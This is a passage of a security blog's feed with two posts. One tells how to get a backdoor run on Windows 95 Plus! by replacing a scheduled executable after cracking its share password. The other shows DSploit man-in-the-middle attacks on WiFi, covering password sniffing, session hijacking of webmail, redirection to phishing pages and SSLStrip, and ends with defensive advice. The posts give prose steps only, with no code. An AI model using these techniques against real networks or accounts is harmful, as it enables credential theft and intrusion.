&lt;/div&gt;Criminals produce the same shitty code as the rest of the world, and thanks to this, some of the malware operators get caught and are behind bars now. And the law is behind the reality, as always.&lt;/div&gt;
&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>Hacking Windows 95, part 2</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/cain/crack/pwl/fluxay/hack/ping/of/death/windows95/2014/05/23/Hacking-Windows-95,-part-2.html"/>
   <updated>2014-05-23T19:45:05+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/cain/crack/pwl/fluxay/hack/ping/of/death/windows95/2014/05/23/Hacking-Windows-95,-part-2</id>
   <content type="html">&lt;div style=&quot;&quot;&gt;In the &lt;a href=&quot;http://jumpespjump.blogspot.be/2014/02/hacking-windows-95-part-1.html&quot; target=&quot;_blank&quot;&gt;Hacking Windows 95, part 1&lt;/a&gt; blog post, we covered that through a nasty bug affecting Windows 95/98/ME, the share password can be guessed in no time. In this article, I'm going to try to use this vulnerability to achieve remote code execution (with the help of publicly available tools only).&lt;br /&gt;&lt;br /&gt;The first thing we can do when we have read access to the Windows directory through the share, is to locate all the *.pwl files on the c:\windows directory, copy them to your machine where Cain is installed, switch to Cracker tab, pwl files, load the pwl file, add username based on the filename, and try to crack it. If you can't crack it you might still try to add a .pwl file where you already know the password in the remote windows directory. Although this is a fun post-exploitation task, but still, no remote code execution. These passwords are useless without physical access.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/winxp_to_hack_win95-2014-05-08-16-59-10.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/winxp_to_hack_win95-2014-05-08-16-59-10.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/winxp_to_hack_win95-2014-05-08-16-59-10.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;One might think that after having a share password and user password, it is easy to achieve remote code execution. The problem is:&lt;/div&gt;
&lt;ul&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;there is no &quot;at&quot; command (available since Windows 95 plus!)&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;there is no admin share&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;there is no RPC&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;there is no named pipes&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;there is no remote registry&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;there is no remote service management&lt;/li&gt;&lt;/ul&gt;
&lt;div style=&quot;&quot;&gt;If you think about security best practices, disabling unnecessary services is always the first task you should do. Because Windows 95 lacks all of these services, it is pretty much secure!&lt;br /&gt;&lt;br /&gt;During my quest for a tool to hack Windows 95, I came across some pretty cool stuff:&lt;br /&gt;&lt;div&gt;&lt;br /&gt;&lt;b&gt;&lt;a href=&quot;http://www.gregthatcher.com/InternetPeriscope/&quot;&gt;Internet periscope&lt;/a&gt;&lt;/b&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/winxp_to_hack_win95-2014-05-08-17-06-52.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/winxp_to_hack_win95-2014-05-08-17-06-52.png&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/winxp_to_hack_win95-2014-05-08-17-06-52.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;/div&gt;&lt;div&gt;&lt;b&gt;&lt;a href=&quot;http://sourceforge.net/projects/winfingerprint/&quot;&gt;Winfingerprint&lt;/a&gt;&lt;/b&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/winfingerprint.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/winfingerprint.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/winfingerprint.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;b&gt;&lt;a href=&quot;http://lantricks.com/download/&quot;&gt;LanSpy&lt;/a&gt;&lt;/b&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/lanspy.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/lanspy.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/lanspy.png&quot; width=&quot;290&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;But the best of the best is &lt;b&gt;&lt;a href=&quot;http://download.csdn.net/detail/zheng127/4552709&quot;&gt;Fluxay&lt;/a&gt;&lt;/b&gt;, which has been written by chinese hackers. It is the metasploit from the year 2000. A screenshot is worth more than a 1000 words. 4 screenshot &amp;gt; 4 thousand words :)&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/fluxay1.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/fluxay1.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/fluxay1.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/fluxay2.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/fluxay2.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/fluxay2.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/fluxay3.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/fluxay3.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/fluxay3.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/fluxay4.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/fluxay4.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/fluxay4.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;It is pretty hard to find the installer, but it is still out there!&lt;br /&gt;&lt;br /&gt;But at the end, no remote code execution for me.&lt;/div&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;My idea here was that if I can find a file which executes regularly (on a scheduled basis), I can change that executable to my backdoor and I'm done. Although there is no scheduler in the default Windows 95, I gave it a try. &lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Let's fire up taskman.exe to get an idea what processes are running:&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Windows+95-2014-01-07-21-18-47.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/Windows+95-2014-01-07-21-18-47.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Windows+95-2014-01-07-21-18-47.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Looks like we need a more powerful tool here, namely Process Explorer. Let's try to download this from oldapps.com:&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Windows+95-2014-02-02-12-12-30.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/Windows+95-2014-02-02-12-12-30.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Windows+95-2014-02-02-12-12-30.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;LOL, IE3 hangs, can't render the page. Copying files to the Win95 VM is not that simple, because there are no shared folders in Win95 VM. And you can't use pendrives either, Win95 can't handle USB (at least the retail version). After downloading the application with a newer browser from oldapps, let's start Process Explorer on the test Windows 95.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Windows+95-2014-01-07-21-32-15.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/Windows+95-2014-01-07-21-32-15.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Windows+95-2014-01-07-21-32-15.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;Don't try to download the Winsocks 2 patch from the official MS site, it is not there anymore, but you can download it from &lt;a href=&quot;ftp://ftp.ema.fr/pub/pc/windows/securite/&quot;&gt;other sites&lt;/a&gt;. &lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Now let's look at the processes running:&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/procexp_running.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/procexp_running.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/procexp_running.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;After staring it for minutes, turned out it is constant, no new processes appeared.&lt;br /&gt;Looking at the next screenshot, one can notice this OS was not running a lot of background processes ...&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/procexp2.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/procexp2.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/procexp2.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;My current Win7 has 1181 threads and 84 processes running, no wonder it is slow as hell :)&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;We have at least the following options:&lt;/div&gt;
&lt;ol&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;You are lucky and not the plain Windows 95 is installed, but Windows 95 Plus! The main difference here is that Windows 95 Plus! has built-in scheduler, especially the &quot;at&quot; command. Just overwrite a file which is scheduled to execution, and wait. Mission accomplished!&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Ping of death - you can crash the machine (no BSOD, just crash) with long (over 65535 bytes) ICMP ping commands, and wait for someone to reboot it. Just don't forget to put your backdoor on the share and add it to autoexec.bat before crashing it. &lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;If your target is a plain Windows 95, I believe you are out of luck. No at command, no named pipes, no admin share, nothing. Meybe you can try to fuzz port 137 138 139, and write an exploit for those. Might be even Ping of Death is exploitable?&lt;/li&gt;&lt;/ol&gt;
&lt;div style=&quot;&quot;&gt;Let's do the first option, and hack Windows 95 plus!&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Look at the cool features we have by installing Win95 Plus!&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/win95plus_features.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/win95plus_features.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/win95plus_features.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;Cool new boot splash screen!&lt;/div&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/win95_plus_boot.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/win95_plus_boot.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/win95_plus_boot.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;But our main interest is the new, scheduled tasks!&lt;/div&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/win95_scheduled_tasks.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/win95_scheduled_tasks.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/win95_scheduled_tasks.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;Now we can replace diskalm.exe with our backdoor executable, and wait maximum one hour to be scheduled.&lt;br /&gt;&lt;br /&gt;Instead of a boring text based tutorial, I created a YouTube video for you. Based on the feedbacks on my previous tutorialz, it turned out I'm way too old, and can't do interesting tutorials. That's why I analyzed the cool skiddie videoz, and found that I have to do the followings so my vidz won't suck anymore:&lt;br /&gt;&lt;ul&gt;&lt;li&gt;use cool black windows theme&lt;/li&gt;&lt;li&gt;put meaningless performance monitor gadgets on the sidebar&lt;/li&gt;&lt;li&gt;use a cool background, something related with hacking and skullz&lt;/li&gt;&lt;li&gt;do as many opsec fails as possible&lt;/li&gt;&lt;li&gt;instead of captions, use notepad with spelling errorz&lt;/li&gt;&lt;li&gt;there is only one rule of metal: &lt;a href=&quot;http://www.youtube.com/watch?v=Hreqn9j3PHI&quot;&gt;Play it fuckin' loud!!!!&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div style=&quot;&quot;&gt;&lt;iframe allowfullscreen=&quot;&quot; frameborder=&quot;0&quot; height=&quot;480&quot; src=&quot;//www.youtube-nocookie.com/embed/x5Yt5UjLR1w?rel=0&quot; width=&quot;640&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>DSploit</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/android/arp/poisoning/hacking/mitm/session/hijack/2014/04/29/DSploit.html"/>
   <updated>2014-04-29T13:55:47+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/android/arp/poisoning/hacking/mitm/session/hijack/2014/04/29/DSploit</id>
   <content type="html">&lt;div style=&quot;&quot;&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;DSploit&lt;/h3&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;div style=&quot;&quot;&gt;After playing with the applications installed on the &lt;a href=&quot;http://jumpespjump.blogspot.com/2014/04/wifi-hacking-on-tablets.html&quot;&gt;Pwn Pad&lt;/a&gt;, I found that the most important application (at least for me) was missing from the pre-installed apps. Namely, &lt;a href=&quot;http://dsploit.net/&quot;&gt;DSploit&lt;/a&gt;. Although DSploit has tons of features, I really liked the multiprotocol password sniffing (same as dsniff) and the session hijacking functionality.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;The DSploit APK in the Play Store was not working for me, but the latest nightly on http://dsploit.net worked like a charm.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;Most features require that you and your target uses the same WiFi network, and that's it. It can be Open, WEP, WPA/WPA2 Personal. On all of these networks, DSploit will sniff the passwords - because of the &lt;a href=&quot;http://dsploit.net/2013/03/22/dsploit-internals-and-arp-cache-poisoning/&quot;&gt;active attacks&lt;/a&gt;. E.g. a lot of email clients still use IMAP with clear text passwords, or some webmails, etc. &lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;First, DSploit lists the AP and the known devices on the network. In this case, I chose one victim client.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/dsploit_01.png&quot; src=&quot;https://z6543.github.io/_img/dsploit_01.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/dsploit_01.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;In the following submenu, there are tons of options, but the best features are in the MITM section. &lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/dsploit_02.png&quot; src=&quot;https://z6543.github.io/_img/dsploit_02.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/dsploit_02.png&quot; width=&quot;251&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;Stealthiness warning: in some cases, I received the following popup on the victim Windows:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/attack1.png&quot; src=&quot;https://z6543.github.io/_img/attack1.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/attack1.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;This is what we have under the MITM submenu:&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/dsploit_03.png&quot; src=&quot;https://z6543.github.io/_img/dsploit_03.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/dsploit_03.png&quot; width=&quot;302&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;Password sniffing&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;For example, let's start with the &lt;b&gt;Password Sniffer&lt;/b&gt;. It is the same as EvilAP and DSniff in my previous post. With the same results for the popular Hungarian webmail with the default secure login checkbox turned off. Don't forget, this is not an Open WiFi network, but one with WPA2 protection!&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/freemail_password.png&quot; src=&quot;https://z6543.github.io/_img/freemail_password.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/freemail_password.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;Session hijack&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;Now let's assume that the victim is very security-aware and he checks the secure login checkbox. Another cause can be that the victim already logged in, long before we started to attack. The &lt;b&gt;session hijacking &lt;/b&gt;function is similar to the &lt;a href=&quot;http://codebutler.com/firesheep/&quot;&gt;Firesheep&lt;/a&gt; tool, but it works with every website where the session cookies are sent in clear text, and there is no need for any additional support.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;In a session hijacking attack (also called &quot;sidejacking&quot;), after the victim browser sends the authentication cookies in clear text, DSploit copies these cookies into its own browser, and opens the website with the same cookies, which results in successful login most of the time. Let's see session hijacking in action!&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;Here, we can see that the session cookies have been sniffed from the air:&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/freemail_session.png&quot; src=&quot;https://z6543.github.io/_img/freemail_session.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/freemail_session.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;Let's select that session, and be amazed that we logged into the user's webmail session.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/freemail_loggedin.png&quot; src=&quot;https://z6543.github.io/_img/freemail_loggedin.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/freemail_loggedin.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/much-hacking.png&quot; src=&quot;https://z6543.github.io/_img/much-hacking.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/much-hacking.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;Redirect traffic&lt;/h3&gt;This feature can be used both for fun or profit. For fun, you can redirect all the victim traffic to http://www.kittenwar.com/. For-profit, you can redirect your victim to phishing pages.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/kittenwar.png&quot; src=&quot;https://z6543.github.io/_img/kittenwar.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/kittenwar.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;h3&gt;Replace images, videos&lt;/h3&gt;I think this is just for fun here. Endless Rick Rolling possibilities.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/rickrolled3.jpg&quot; src=&quot;https://z6543.github.io/_img/rickrolled3.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/rickrolled3.jpg&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;h3&gt;Script injection&lt;/h3&gt;This is mostly for profit. client-side injection, drive-by-exploits, endless possibilities.&lt;br /&gt;&lt;br /&gt;&lt;h3&gt;Custom filter&lt;/h3&gt;If you are familiar with ettercap, this has similar functionalities (but dumber), with string or regex replacements. E.g. you can replace the news, stock prices, which pizza the victim ordered, etc. If you know more fun stuff here, please leave a comment (only HTTP scenario - e.g. attacking Facebook won't work).&lt;br /&gt;&lt;br /&gt;&lt;h3&gt;Additional fun (not in DSploit) - SSLStrip &lt;/h3&gt;From the MITM section of DSploit, I really miss the SSLStrip functionality. Luckily, it is built into the Pwn Pad. With the help of SSLStrip, we can remove the references to HTTPS links in the clear text HTTP traffic, and replace those with HTTP. So even if the user checks the secure login checkbox at freemail.hu, the password will be sent in clear text - thus it can be sniffed with DSniff.&lt;br /&gt;&lt;br /&gt;HTML source on the client-side without SSLstrip:&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/sslstrip_freemail2.png&quot; src=&quot;https://z6543.github.io/_img/sslstrip_freemail2.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/sslstrip_freemail2.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;HTML source on the client-side with SSL strip:&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/sslstrip_freemail.png&quot; src=&quot;https://z6543.github.io/_img/sslstrip_freemail.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/sslstrip_freemail.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;With EvilAP, SSLStrip, and DSniff, the password can be stolen. No hacking skillz needed.&lt;br /&gt;&lt;h3&gt;Lessons learned here&lt;/h3&gt;If you are a website operator where you allow your users to login, always:&lt;br /&gt;&lt;ol&gt;&lt;li&gt;Use HTTPS with a trusted certificate, and redirect all unencrypted traffic to HTTPS ASAP&lt;/li&gt;&lt;li&gt;Mark the session cookies with the &lt;a href=&quot;https://www.owasp.org/index.php/SecureFlag&quot;&gt;secure flag&lt;/a&gt;&lt;/li&gt;&lt;li&gt;Use &lt;a href=&quot;http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security&quot;&gt;HSTS&lt;/a&gt; to prevent SSLStrip attacks&lt;/li&gt;&lt;/ol&gt;&lt;div&gt;If you are a user:&lt;/div&gt;&lt;ol&gt;&lt;li&gt;Don't trust sites with your confidential data if the above points are not fixed. Choose a more secure alternative&lt;/li&gt;&lt;li&gt;Use HTTPS everywhere plugin&lt;/li&gt;&lt;li&gt;For improved security, 